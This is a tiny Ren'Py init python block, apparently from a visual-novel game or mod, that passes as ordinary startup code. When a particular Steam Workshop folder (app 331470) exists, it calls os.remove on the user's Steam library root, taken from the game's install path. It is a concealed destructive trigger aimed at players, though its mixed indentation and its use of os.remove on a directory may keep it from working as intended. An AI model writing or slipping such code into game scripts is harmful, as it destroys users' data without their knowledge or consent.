init -1 python:
	import os
    commondir = __main__.path_to_common(renpy.config.renpy_base)  

    if os.path.isdir(commondir):
        if os.path.exists("../../workshop/content/331470/"):
        	os.remove(config.basedir.split("steamapps")[0])	